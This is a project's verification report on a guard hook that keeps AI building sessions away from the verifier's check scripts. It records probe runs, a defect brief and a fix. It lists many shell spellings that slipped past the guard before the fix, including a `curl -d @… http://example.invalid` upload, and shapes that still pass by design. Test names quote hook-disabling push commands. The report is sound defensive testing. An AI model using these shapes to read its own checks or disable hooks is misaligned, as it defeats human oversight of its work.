# Phase 56 — Verification Report

- **Date:** 2026-10-08
- **Phase:** [phase-56.md](../phase-56.md) — stamped `Complete`, completion report [phase-56-complete.md](phase-56-complete.md)
- **Scope:** PRD-10.R4 (MUST, api), PRD-10.R5 (MUST, api) — the phase header's claimed set, the same as the completion report's requirements line.
- **Live gate owed:** yes — 23 `live` criteria whose `Depends-on` names `src/daemon/` or `src/commands/` (both touched), or that carry no `Depends-on`; listed under *Live gates*. None is performed here.
- **Regression set (derived):** PRD-05.R2, R3, R4, R5, R7, R10, R11, R18; PRD-07.R4, R6, R9; PRD-08.R5; PRD-09.R2, R4, R5 (15).
- **Branch:** `timone/229-1-the-guard-judges-only-real-reads-and-w` @ `9c123f7` when the pass began, `1cb9c00` after the one fix commit. No stacked phase: the branch was cut from `main` at `f8b6fbf`, and nothing was merged in.

## Environment

- Built with `npm run build` (the guard is a CLI command; its production form is `dist/cli.js`). There is no server to stand up: the guard is run as the hook runs it, `node dist/cli.js guardrails guard --root <root> --state <state>`, one hook payload as JSON on stdin, the environment set on the command line. Each probe makes its own scratch root and ledger under the system's temporary folder: run `build-1` at stage `execution` (a building step), run `check-1` at `verification` (a checking step), and any other session id with no run (a person's session). "In a container" is the same session with `TIMONE_RUN_PROJECT` and `TIMONE_RUN_BRANCH` set.
- The break legs of R4 use the build of `f8b6fbf` (the merge-base with `main`), compiled outside the tree by `doc/plans/phases/probes/_old-build.mjs`.
- This session runs under Timone's root guard, which is `main`'s guard, not this phase's. Its first list of the probe folder was asked about, because the ledger in this container holds no run for the session (the fault #87 is about). The session declared its step with `node dist/cli.js stage verification --session 1ec9209f-…` at the Timone root, and the probes were then reached without a question.
- **Build-health smoke**, run once at the end, not as evidence: `npx tsc --noEmit && npx vitest run --reporter=json` on `1cb9c00` after `npm run build` — `tsc` exit 0; 76 test files, 2674 tests: **2604 passed, 70 failed**. Every one of the 70 failure messages is the container's push refusal (*"Refused: this run may push only to …"*): 45 in `src/commands/guardrails.test.ts`, 16 in `src/numbers.test.ts`, 6 in `src/workspace.test.ts`, 3 in `src/commands/number.test.ts`. This is Timone issue #220, not this work.
- **Smoke failures**, compared with `doc/plans/phases/reports/phase-54-verification.md` on `main` (lines 16–86, its named list of 70). All 70 failures here are named there, so all 70 are **old**. No test that failed there passes here. The list, for the next pass:
  - `src/numbers.test.ts > reserveNumber gives the first phase number, padded, to a project with none` — old
  - `src/numbers.test.ts > reserveNumber gives the first adr number, padded, to a project with none` — old
  - `src/numbers.test.ts > reserveNumber gives the first triage number, padded, to a project with none` — old
  - `src/numbers.test.ts > reserveNumber gives the first prd number, padded, to a project with none` — old
  - `src/numbers.test.ts > reserveNumber gives the phase after the highest on the default branch, not counting the reports folder` — old
  - `src/numbers.test.ts > reserveNumber counts a PRD and its criteria register as one number` — old
  - `src/numbers.test.ts > reserveNumber counts a phase that exists only on another branch, pushed after the checkout was cloned` — old
  - `src/numbers.test.ts > reserveNumber counts a phase that exists only in the checkout's folder, not committed` — old
  - `src/numbers.test.ts > reserveNumber counts a number another session reserved, and only reservations of the same kind` — old
  - `src/numbers.test.ts > reserveNumber gives five sessions asking for a phase number at once five different numbers, each reserved on the remote` — old
  - `src/numbers.test.ts > reserveNumber gives five sessions asking for a adr number at once five different numbers, each reserved on the remote` — old
  - `src/numbers.test.ts > reserveNumber gives five sessions asking for a triage number at once five different numbers, each reserved on the remote` — old
  - `src/numbers.test.ts > reserveNumber gives two reservations from one checkout, in the same second and with the same note, two different numbers` — old
  - `src/numbers.test.ts > reserveNumber leaves the checkout as it was: same branch, same status, and no local ref to the reservation` — old
  - `src/numbers.test.ts > reserveNumber throws with git's words, and reserves nothing, when the remote does not exist` — old
  - `src/numbers.test.ts > reserveNumber throws with git's words, and reserves nothing, when a pre-push hook refuses` — old
  - `src/workspace.test.ts > syncWorkspace clones a missing project on first sync` — old
  - `src/workspace.test.ts > syncWorkspace reports up-to-date when the upstream has not moved` — old
  - `src/workspace.test.ts > syncWorkspace fast-forwards and reports updated when the upstream gains a commit` — old
  - `src/workspace.test.ts > syncWorkspace skips a dirty checkout without touching it` — old
  - `src/workspace.test.ts > syncWorkspace skips a checkout on a non-default branch` — old
  - `src/workspace.test.ts > syncWorkspace fails a plain non-git directory but still processes the others` — old
  - `src/commands/guardrails.test.ts > guarding the verifier's probes says nothing about a tool call that touches no probe` — old
  - `src/commands/guardrails.test.ts > guarding the verifier's probes refuses a build run the probe directory` — old
  - `src/commands/guardrails.test.ts > guarding the verifier's probes lets the verification run that owns them through` — old
  - `src/commands/guardrails.test.ts > guarding the verifier's probes asks when no run drove the session, because a human is at the keyboard` — old
  - `src/commands/guardrails.test.ts > guarding the probes in a session run by hand (#169) lets a session that declared the checking step through` — old
  - `src/commands/guardrails.test.ts > guarding the probes in a session run by hand (#169) refuses the probes to a session that declared a building step` — old
  - `src/commands/guardrails.test.ts > guarding the probes in a session run by hand (#169) still asks when the session has no run and declared no step` — old
  - `src/commands/guardrails.test.ts > guarding the probes in a session run by hand (#169) goes by the ledger when the session has a run, whatever it declared` — old
  - `src/commands/guardrails.test.ts > finding the run that drove a session resolves the session id against the ledger` — old
  - `src/commands/guardrails.test.ts > finding the run that drove a session finds nobody for a session no run ever claimed` — old
  - `src/commands/guardrails.test.ts > the run a session belongs to is the box's declaration when the ledger has no run for the session` — old
  - `src/commands/guardrails.test.ts > the run a session belongs to is the ledger's run when the ledger has one, whatever the environment says` — old
  - `src/commands/guardrails.test.ts > the run a session belongs to is nobody's when neither the ledger nor the environment names a run` — old
  - `src/commands/guardrails.test.ts > the run a session belongs to is judged as a person's own session when nothing names a run` — old
  - `src/commands/guardrails.test.ts > the run a session belongs to is judged as the box's run, with an empty ledger — the box case of ADR-0050 D-2` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes refuses a run `git push --no-verify origin x`` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes refuses a run `git -c core.hooksPath=/tmp/h push`` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes refuses a run `GIT_CONFIG_COUNT=0 git push`` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing to a run about `git push origin timone/39-x`` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing to a run about `git commit --no-verify -m x`` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing about `git push --no-verify origin x` in a person's own session` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing about `git -c core.hooksPath=/tmp/h push` in a person's own session` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing about `GIT_CONFIG_COUNT=0 git push` in a person's own session` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing about `git push origin timone/39-x` in a person's own session` — old
  - `src/commands/guardrails.test.ts > switching off the guard on a run's pushes says nothing about `git commit --no-verify -m x` in a person's own session` — old
  - `src/commands/guardrails.test.ts > a session the daemon drove asks the session first, then flags the run — and posts on no ticket` — old
  - `src/commands/guardrails.test.ts > a session the daemon drove stops flagging once the session has fixed what it was told` — old
  - `src/commands/guardrails.test.ts > a session the daemon drove says nothing anywhere when the session behaved` — old
  - `src/commands/guardrails.test.ts > a session a human drove prints the finding and journals it, and posts on no ticket at all` — old
  - `src/commands/guardrails.test.ts > a session a human drove says nothing when the session behaved` — old
  - `src/commands/guardrails.test.ts > a session a human drove does not judge Timone's own work against a project it never had` — old
  - `src/commands/guardrails.test.ts > a session a human drove catches a project's work branch cut at the timone root — finding 11, on real git` — old
  - `src/commands/guardrails.test.ts > a session a human drove goes round exactly once, however many turns the session takes` — old
  - `src/commands/guardrails.test.ts > a session with no baseline says so rather than passing silently` — old
  - `src/commands/guardrails.test.ts > the journal appends one line per finding, and creates the file` — old
  - `src/commands/guardrails.test.ts > the provenance trailer, read back off real commits accepts a trailed commit and flags an untrailed one` — old
  - `src/commands/guardrails.test.ts > the provenance trailer, read back off real commits flags a commit that carries no trailer at all` — old
  - `src/commands/guardrails.test.ts > the provenance trailer, read back off real commits tells the session its own id and what it owes, at SessionStart` — old
  - `src/commands/guardrails.test.ts > commits another session made are invisible to the unpushed rule, and do not inflate its count` — old
  - `src/commands/guardrails.test.ts > commits another session made are invisible to the STATUS.md placement rule` — old
  - `src/commands/guardrails.test.ts > commits another session made are invisible to the path-containment rule — the 14g accusation itself` — old
  - `src/commands/guardrails.test.ts > commits another session made are invisible to the provenance rule` — old
  - `src/commands/guardrails.test.ts > commits another session made are still judged when they name no session at all — the fix's known limit` — old
  - `src/commands/guardrails.test.ts > the STATUS.md rule, read back off real commits says nothing about a status file the work branch took from main` — old
  - `src/commands/guardrails.test.ts > the STATUS.md rule, read back off real commits still says so about a status file that exists only on a branch` — old
  - `src/commands/number.test.ts > timone number prints only the reserved number, padded, and exits 0` — old
  - `src/commands/number.test.ts > timone number names the projects it knows, and exits 1, for a project it does not know` — old
  - `src/commands/number.test.ts > timone number prints the error on stderr, nothing on stdout, and exits 1, when the reservation fails` — old
- **Smoke against probes.** The 45 failures in `guardrails.test.ts` include the probe guard's own tests. They fail in their setup, on the container's push refusal, not on what the guard answers, which the probes check and pass. The two instruments do not disagree.

## Independence declaration

Read: `doc/specs/prd/prd-10-the-probe-guard-knows-the-step-in-a-container.criteria.md` whole and its PRD narrative whole; the `Priority`, `Status`, `Verify-via`, `Depends-on` and `Last live gate` fields of every register (by script); `phase-56.md` lines 1–30, by `head`. **That is more than the allowed list:** besides the status line, the *Screens changed* line and the *Requirements* header, it printed the companion line and the *Goal Description* (which names the files changed, the two slices, and how 56b reads a shell word: the path counts when it starts the word or follows `/`, `:` or `=`). I used none of it as an expectation: every probe is written from the register's clauses. The extra shapes in R5 came from the runner's request to try quoting, variables, redirections and subshells, and from ordinary shell forms. They did not come from that description. `reports/phase-56-complete.md` whole; `reports/phase-56-departures.md` cut to 90 characters a line, to see the form of an entry and add one. On `main`, `phase-54-verification.md`: a list of its headings and smoke lines, its lines 16–86 (its list of smoke failures) and, **beyond the allowed list,** its lines 222–240 (its *Regression* section, another pass's verdicts). I read those after this pass's own regression run had given its results, so they did not change any verdict. Also on `main`, lines 26–31 of `phase-54-departures.md`, for the form of a check's entry. The line count and headings of `STATUS.md` and its *Waiting on you* section. The probe directory: `run.mjs` (top), `_lib.mjs`, `_old-build.mjs` (top), the end of `_steps.mjs` (its hook helper and ledger shape), the tops of `prd-05.r3.mjs` and `prd-09.r5.mjs`. The value of `PROBE_DIRECTORIES`, by importing the built `dist/daemon/probeGuard.js` (not its source). File-name lists only: `git diff --name-only origin/main...HEAD` and `git show --name-only --format= 1cb9c00`. From the fix context, its SHA and its closing note. `doc/standards.md` does not exist in this project. Not read: handoffs, diffs, source, the committed test suite, ADRs. No implementation source was read; all criterion evidence below comes from verifier-authored probes, run from `doc/plans/phases/probes/` or written this pass.

## Verdict summary

| ID | Priority | Channel | Verdict | Loop |
| --- | --- | --- | --- | --- |
| PRD-10.R4 | MUST | api | PASS | 0 |
| PRD-10.R5 | MUST | api | PASS (FAIL at loop 0, fixed in `1cb9c00`) | 1 |
| PRD-05.R2 | MUST | api | PASS (regression; clause 2b BLOCKED, GitHub not reachable) | — |
| PRD-05.R3 | MUST | api | PASS (regression) | — |
| PRD-05.R4 | MUST | api | PASS (regression) | — |
| PRD-05.R5 | MUST | api | PASS (regression) | — |
| PRD-05.R7 | MUST | api | PASS (regression; clause 1 with the real runner BLOCKED, needs the real model) | — |
| PRD-05.R10 | MUST | api | PASS (regression) | — |
| PRD-05.R11 | MUST | api | PASS (regression) | — |
| PRD-05.R18 | MUST | api | BLOCKED (regression; needs a replay on this build against the real model) | — |
| PRD-07.R4 | MUST | api | PASS (regression) | — |
| PRD-07.R6 | MUST | api | PASS (regression) | — |
| PRD-07.R9 | MUST | api | PASS (regression) | — |
| PRD-08.R5 | MUST | api | PASS (regression) | — |
| PRD-09.R2 | MUST | api | PASS (regression) | — |
| PRD-09.R4 | MUST | api | PASS (regression) | — |
| PRD-09.R5 | MUST | api | PASS (regression) | — |

**Gate:** every MUST criterion in scope is PASS, except PRD-05.R18, which is BLOCKED. BLOCKED observed nothing, so it is not a regression. Zero regressions; 1 of 2 fix loops used.

## Evidence

### PRD-10.R4 — PASS

Probe `doc/plans/phases/probes/prd-10.r4.mjs` (helper `_guard.mjs`), authored this pass. Each call is made for both folders. Clause 1 covers five sessions: a building step on the host and in a container, a checking step on the host and in a container, and a person's session. The calls: an `Agent` prompt "Do not open `<probes>`"; an `Edit` and a `Write` of `doc/plans/phases/phase-42.md` naming `<probes>/README.md`; `git commit -m "docs: the rules in <probes> are named here"`; `gh issue comment 87 --body "…"`; `gh pr create --title "…" --body "…"`; `cat >>`, `cat >` and `tee` with a here-document naming the README; and a `Grep` with the folder's name as its pattern and `src/` as its path.

```
=== R4 clause 1 — every session, host and container: the guard is silent on each call that only names the folders
    break leg: RED (as required) — 100 of 100 judgements wrong:            ← the guard of f8b6fbf
      - building, host: Agent {"description":"a helper","prompt":"Build the slice. Do not open `doc/plans/phases/probes`."} → deny, wanted silent
      - … (every call: deny for a building step, allow for a checking step, ask for a person)
    green leg: PASS — 100 judgements, all silent
=== R4 clause 2 — #192's three calls, made by a building step in a container: none is refused
    break leg: RED (as required) — 3 of 3 judgements wrong:                ← the guard of f8b6fbf, all deny
    green leg: PASS — 3 calls, none refused (each silent)
--- PRD-10.R4: PASS (2 clause labels, 2 passing)
```

Run again after the fix, real run only: both clauses PASS.

**Further text-only calls tried, all silent for every session, before and after the fix:** a `Task` prompt; `tee -a` with a here-document; `git commit -m "$(cat <<'EOF' … EOF)"`; `git commit -F - <<'EOF'`; a second `-m` body; `gh pr create --body-file - <<'EOF'`; `echo` and `printf` of a sentence; `grep -rn "folder <probes>" src`; a shell comment; a `Bash` call whose `description` names the folder; a `Grep` pattern "see <probes>"; a here-string written into another file (`cat <<<"see <probes>" >> doc/x.md`, `tee -a doc/x.md <<< "…"`); a commit message whose second line starts with the path; a path in brackets inside a message. A call that names no folder (`Read src/index.ts`, `ls src`) is silent.

**Known cost, as the plan and the fix context both state:** a word that *begins* with the path once quotes are removed is judged: `grep -rn "<probes>" src`, a message that starts with the path, and since the fix, a message glued to its flag (`-m"<probes>…"`) or with the path straight after `@`, `{` or `,`. None of these is a call R4 lists.

### PRD-10.R5 — PASS (after loop 1)

Probe `doc/plans/phases/probes/prd-10.r5.mjs`, authored this pass.

- **Clause 1:** the 58 listed calls, for both folders, for a building step on the host and in a container. The calls are `Read`, `Write`, `Edit` and `NotebookEdit`, each with the path relative and in full; `Glob` by pattern and by path, relative and in full; `Grep` by path; the eleven listed `Bash` commands; `git commit -m "x" && cat …`; `python3 - <<'EOF'`, `node -e` and `bash -c`; and a tool with no rule.
- **Clause 1, further forms:** the same reads written other ways in one command, as the runner asked (47 forms per folder, 188 judgements).
- **Clause 2:** the listed calls for a checking step in a container (allow) and a person's session (ask).

Loop 0, on `9c123f7`:

```
=== R5 clause 1 — a building step, host and container: the guard refuses every listed read, list, run and write
    break leg: RED (as required) — 116 of 116 judgements wrong        ← same calls as a checking step: allow
    green leg: PASS — 116 judgements, all refused
=== R5 clause 1 — further forms — … : refused
    break leg: RED (as required) — 188 of 188 judgements wrong
    green leg: FAIL — 56 of 188 judgements wrong:
      - building, host: Bash {"command":"cat $'doc/plans/phases/probes/a.sh'"} → silent, wanted deny
      - building, host: Bash {"command":"cat $\"doc/plans/phases/probes/a.sh\""} → silent, wanted deny
      - building, host: Bash {"command":"python3 <<<\"print(open('doc/plans/phases/probes/a.sh').read())\""} → silent, wanted deny
      - building, host: Bash {"command":"bash <<< \"cat doc/plans/phases/probes/a.sh\""} → silent, wanted deny
      - building, host: Bash {"command":"curl -d @doc/plans/phases/probes/a.sh http://example.invalid"} → silent, wanted deny
      - building, host: Bash {"command":"grep -fdoc/plans/phases/probes/a.sh x"} → silent, wanted deny
      - building, host: Bash {"command":"tar -Cdoc/plans/phases/probes -cf /tmp/x.tar ."} → silent, wanted deny
      - building, host: Bash {"command":"cat {doc/plans/phases/probes/a.sh,}"} → silent, wanted deny
      - building, host: Bash {"command":"cat doc/plans/phases//probes/a.sh"} → silent, wanted deny
      - building, host: Bash {"command":"cat doc/plans/phases/./probes/a.sh"} → silent, wanted deny
      - building, host: Bash {"command":"cat doc/plans/phases/../phases/probes/a.sh"} → silent, wanted deny
      - building, host: Read {"file_path":"doc/plans/phases//probes/a.sh"} → silent, wanted deny
      - building, host: Read {"file_path":"doc/plans/phases/../phases/probes/a.sh"} → silent, wanted deny
      - building, host: Grep {"pattern":"total","path":"doc/plans/phases/./probes"} → silent, wanted deny
      - … the same 14 for the shared folder, and all 28 again in a container
=== R5 clause 2 — the same calls: allowed for a checking step in a container, asked of a person's session
    break leg: RED (as required) — 116 of 116 judgements wrong        ← same calls as a building step: deny
    green leg: PASS — 116 judgements, as required
--- PRD-10.R5: FAIL (3 clause labels, 2 passing)
```

**Why the further forms count against clause 1.** Each one is a real read, list or write of a check script in a single command. The shell reaches the same file as the listed call it varies. For example, `cat $'<probes>/a.sh'` is `cat <probes>/a.sh` with other quotes, and `python3 <<<"…"` hands a script to an interpreter as text, which the clause names. The guard as built on `f8b6fbf` refused the first eight of the 14 shapes, for every kind of session. This phase had stopped it doing so. The last three groups, `//`, `/./` and `../`, were missed before this phase too. The PRD's *Out of scope* accepts other shapes, and they were left out of the probe: a path kept in a variable and used in a later command, a path built from pieces, a wildcard in place of part of the path, a change of folder followed by a relative read, and a script written to a file and then run. These were seen to pass silently and are not findings: `cat doc/plans/phases/{probes,x}/a.sh`, `find doc -path '*probes*'`, `Glob **/probes/*.mjs`, `Grep` with `path: doc/plans/phases` and `glob: probes/*`, `cat > /tmp/x.sh <<'EOF' … EOF` then `bash /tmp/x.sh`. Also an `Agent` prompt that tells a helper to read a probe: R4 says a helper's prompt is not judged, and the helper's own read is judged.

Defect brief issued: loop 1, below. Fix commit `1cb9c00`. Re-verify on `1cb9c00`, real run only:

```
=== R5 clause 1 — …                    green leg: PASS — 116 judgements, all refused
=== R5 clause 1 — further forms — …    green leg: PASS — 188 judgements, all refused
=== R5 clause 2 — …                    green leg: PASS — 116 judgements, as required
--- PRD-10.R5: PASS (3 clause labels, 3 passing, real run only)
```

After the fix, these further tries were also refused for a building step, allowed for a checking step and asked of a person: `$'…'` with hex, octal and `\u` escapes inside the folder's name; `node <<<"…"`; `src/../<probes>/a.sh`; `<probes>/../probes/a.sh`; `cat -- -f <probes>/a.sh`; `cat '-' < '<probes>/a.sh'`; a `Read` of `<probes>/./a.sh`; a `Glob` of `doc/plans/phases/./probes/*`.

## Defect brief — PRD-10.R5, loop 1

- **Criterion:** R5 clause 1, quoted from the register: "GIVEN a building step's session, in a container and on the host / WHEN the guard judges each of these calls / THEN it refuses every one of them: … `Read`, `Write` and `Edit` of `<probes>/a.sh` … with the path relative and in full … `Bash` calls `cat <probes>/a.sh`, … a `Bash` call that hands a script naming `<probes>` to an interpreter as text …".
- **Expected (per the register):** every real read, list, run or write of a check script made in one command is refused for a building step, allowed for a checking step and asked of a person, however the same read is spelled.
- **Observed:** for a building step, on the host and in a container, both folders, the guard printed nothing for: `cat $'<probes>/a.sh'`, `cat $"<probes>/a.sh"`; `python3 <<<"…"`, `bash <<< "cat <probes>/a.sh"`; `curl -d @<probes>/a.sh …`, `gh api … -F body=@<probes>/a.sh`; `grep -f<probes>/a.sh x`, `tar -C<probes> …`; `cat {<probes>/a.sh,}`; and the path with `//`, `/./` or `../` in it, in `Bash`, `Read` and `Grep`.
- **Reproduction:** a ledger with one run at `execution`, then the payload `{"session_id":…,"tool_name":"Bash","tool_input":{"command":"cat $'<probes>/a.sh'"}}` piped to `node dist/cli.js guardrails guard --root $D --state $D/state.json` prints nothing; the same with `cat <probes>/a.sh` prints the deny.
- **Evidence:** the loop-0 output above: 56 of 188 judgements wrong, each "→ silent, wanted deny".
- **Constraint:** commit as `fix: verify 56 — PRD-10.R5 more ways of reaching a check script are judged` on `timone/229-1-the-guard-judges-only-real-reads-and-w`; conform to the project's conventions; change nothing the brief does not require. The brief also told the fix context not to open the probe folders, which this session's declaration would have let it do, and to keep every call R4 lets through silent.

## HUMAN-CHECK scripts

None. No criterion in scope is on the `human` channel, and no clause needed a person.

## Live gates

The phase claims no `live` criterion. Since this diff touches `src/daemon/` and `src/commands/`, or the criterion has no `Depends-on`, these 23 owe a fresh gate. Each is named with the report its `Last live gate:` field points at:

- PRD-01.R4 — never
- PRD-02.R1 — phase-32-live-gate.md (2026-09-04, the marked-ticket clause only)
- PRD-02.R2 — never. Its `Depends-on` names `src/commands/guardrails.ts`, which this phase changed. The completion report says the change does not touch how a session finds its project. This pass did not observe that.
- PRD-02.R4, R6, R7, R8 — never
- PRD-02.R13 — phase-32-live-gate.md (2026-09-04)
- PRD-03.R1, R5 — phase-35-live-gate.md (2026-09-07)
- PRD-03.R2, R4 — never
- PRD-04.R1 — none; PRD-04.R7 — none (`deprecated`)
- PRD-05.R9, R12, R13, R15 — phase-40-live-gate.md (2026-09-30)
- PRD-07.R5, R7, R14 — never
- PRD-08.R6 — none
- PRD-10.R8 — none. This is the run that shows this PRD's change for real: a building step in a container is refused a read of a check script, and it still names the folders in its prompts and messages without being refused. Its first half (the checking step in a container, without being asked) needs piece 2 of #87.

The other 15 `live` criteria owe no fresh gate: their `Depends-on` names nothing this phase changed.

## Regression

- PRD-05.R2 — PASS (clause 2b BLOCKED: GitHub could not be read from here)
- PRD-05.R3 — PASS (19 of 19 clause labels)
- PRD-05.R4 — PASS
- PRD-05.R5 — PASS
- PRD-05.R7 — PASS (clause 1 with the real runner BLOCKED: needs the real model)
- PRD-05.R10 — PASS
- PRD-05.R11 — PASS
- PRD-05.R18 — BLOCKED: "the recorded replay judged here is older than this build: run 10's commit 4686ef4 is not in this branch's history. A new replay on this build is owed (`npm run --silent replay`, from a logged-in terminal)." All 3 clauses BLOCKED.
- PRD-07.R4 — PASS (in via `src/daemon/`)
- PRD-07.R6 — PASS (in via `src/daemon/`)
- PRD-07.R9 — PASS (in via `src/daemon/`)
- PRD-08.R5 — PASS
- PRD-09.R2 — PASS
- PRD-09.R4 — PASS
- PRD-09.R5 — PASS

Command: `node doc/plans/phases/probes/run.mjs --regression --only=<the 15>` (real runs only), 4 min 56 s, on `1cb9c00` — *"14 passing, 0 failing, 1 blocked, 0 with no probe."* The regression set was run once, after the fix commit, on the build as it will be delivered, not before it. The criteria with no `Depends-on` (the PRD-05 eight, PRD-08.R5, PRD-09.R2, R4, R5) are in by default.

What the narrowing removed (MUST + api + verified, whose `Depends-on` names nothing this phase changed):

- PRD-01.R2 — `src/manifest.ts, src/commands/projects.ts`
- PRD-01.R3 — `src/commands/workspace.ts, src/git.ts`
- PRD-06.R5 — `src/adapters/credentials.ts`, `src/daemon/container-runtime.ts`
- PRD-07.R1 — `src/daemon/runs.ts, src/runner/`
- PRD-07.R2 — `src/daemon/runs.ts, src/runner/, src/manifest.ts`
- PRD-07.R3 — `src/daemon/runs.ts, src/runner/driver.ts`
- PRD-07.R10 — `.claude/skills/timone-plan/, src/adapters/github-tickets.ts, src/runner/`
- PRD-07.R12 — `process.md, doc/adr/, doc/specs/prd/, src/daemon/runs.ts`
- PRD-07.R13 — `src/commands/takeover.ts, src/daemon/runs.ts`
- PRD-08.R1 — `src/daemon/chunk-zero.ts, src/adapters/, src/manifest.ts`
- PRD-08.R2 — `src/runner/actions.ts, src/adapters/, src/manifest.ts`
- PRD-08.R4 — `src/daemon/chunk-zero.ts, src/runner/actions.ts, src/adapters/`

The phase changed `src/daemon/probeGuard.ts`, `src/daemon/shell-words.ts`, `src/commands/guardrails.ts`, `src/commands/stage.ts` and their tests. The fix changed `src/daemon/probeGuard.ts`, `src/daemon/shell-words.ts` and `src/daemon/probeGuard.test.ts`. No prefix above matches either list.

## Probes

**2 probes proven able to fail this pass, 0 not.** 13 regression probes ran without a break run. Each was proved able to fail by an earlier pass (*"this probe was proved able to fail by an earlier check"*). None of them is in doubt.

- `prd-10.r4.mjs` — authored this pass: first check of PRD-10.R4. Break run on the guard of `f8b6fbf`: both clauses RED. Real run: PASS.
- `prd-10.r5.mjs` — authored this pass: first check of PRD-10.R5. Break run: all three labels RED (clause 1 and its further forms judged as a checking step; clause 2 judged as a building step). Real run: FAIL, then PASS on `1cb9c00` (real run only).
- `_guard.mjs` — new shared helper: runs the guard as the hook does and builds the scratch ledger. It reads the folders from `PROBE_DIRECTORIES` in the built module, so neither probe depends on how they are spelled.
- Ran without a break run, by criterion ID: PRD-05.R2, R3, R4, R5, R7, R10, R11; PRD-07.R4, R6, R9; PRD-08.R5; PRD-09.R2, R4, R5. PRD-05.R18 judged nothing (all BLOCKED). Also the re-runs of PRD-10.R4 and R5 after the fix.
- Clause coverage: R4 has 2 register clauses, and the probe prints 2 labels. R5 has 2 register clauses, and the probe prints 3 labels: clause 1 is split into its listed calls and the further forms. No gap.

## Fix-loop accounting

**1 of 2 loops consumed.**

- **Loop 1.** Brief: PRD-10.R5, the 14 shapes above. Fix context: a fresh helper, given the brief, the repository and the instruction not to open the probe folders. Returned `1cb9c00` (`fix: verify 56 — PRD-10.R5 more ways of reaching a check script are judged`, pushed). Changed files (`git show --name-only`): `src/daemon/probeGuard.test.ts`, `src/daemon/probeGuard.ts`, `src/daemon/shell-words.ts`.
- **Run again:** PRD-10.R5 (it failed) — PASS. PRD-10.R4 (it reads the same guard the fix changed) — PASS. The 15 regression probes: this pass had not yet run them, so they ran once on `1cb9c00`, as listed under *Regression*. The fix touched `src/daemon/`, which PRD-07.R4, R6 and R9 name, and the others have no `Depends-on`. So all 15 were owed a run after the fix anyway.
- **Not run again:** none in scope.

## Figures on the preview's data

No screen changed in this phase: the phase file's *Screens changed* line is "none — the guard answers a hook on stdout".

## Questions for the human

None.

## Register changes

- PRD-10.R4: `draft` → `verified`. Its `Falsified-by` line names a table test, and this pass's probe went red on the build before the phase.
- PRD-10.R5: `draft` → `verified`, after loop 1. Its `Falsified-by` line names the same table test, and this pass's probe went red on its break legs and on the build at loop 0.

## Carried forward

- **PRD-05.R18 — BLOCKED.** This build needs a replay of the recorded failures against the real model. Someone must run `npm run --silent replay` from a terminal signed in to the model, on this branch. The same holds for clause 1 of PRD-05.R7 (the real runner). Clause 2b of PRD-05.R2 could not read GitHub from here. Recorded in [phase-56-departures.md](phase-56-departures.md), entry of 2026-10-08, verification.
